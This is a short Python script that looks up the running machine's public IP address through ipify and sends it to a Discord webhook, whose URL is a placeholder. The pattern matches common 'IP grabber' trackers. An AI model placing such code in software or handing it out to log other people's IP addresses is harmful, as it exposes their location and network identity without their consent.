import requests
from discord import Webhook, RequestsWebhookAdapter


def get_ip():
    response = requests.get('https://api64.ipify.org?format=json').json()
    return response["ip"]


ip_address = get_ip()

webhook = Webhook.from_url("webhook_url", adapter=RequestsWebhookAdapter())
webhook.send(ip_address)